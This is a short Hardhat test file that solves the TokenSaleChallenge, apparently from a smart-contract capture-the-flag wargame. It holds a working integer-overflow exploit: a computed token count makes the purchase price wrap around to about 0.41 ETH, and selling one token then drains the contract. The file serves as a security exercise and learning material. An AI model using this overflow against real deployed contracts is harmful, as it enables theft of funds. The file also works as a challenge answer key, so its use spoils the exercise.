const { expect } = require("chai");
const { utils } = ethers;

describe("TokenSaleChallenge", () => {
  let tokenSale;
  beforeEach(async () => {
    const myAddress = (await ethers.getSigners())[0].address;

    const TS = await ethers.getContractFactory("TokenSaleChallenge");
    tokenSale = await TS.deploy(myAddress, {
      value: utils.parseEther("1"),
    });
    await tokenSale.deployed();
  });

  it("isComplete() should return true", async () => {
    // FORMULAS
    // numTokens = MAX_UNIT_256 / PRICE_PER_TOKEN + 1;
    // msg.value = numTokens - MAX_UNIT_256;

    // msg.value == numTokens * PRICE_PER_TOKEN
    // 2^256 / 10^18 + 1 = 115792089237316195423570985008687907853269984665640564039458
    // (2^256 / 10^18 + 1) * 10^18 - 2^256 = 415992086870360064 ~= 0.41 ETH
    await tokenSale.buy(
      "115792089237316195423570985008687907853269984665640564039458",
      {
        value: "415992086870360064",
      }
    );

    await tokenSale.sell(1);

    expect(await tokenSale.isComplete()).to.be.true;
  });
});
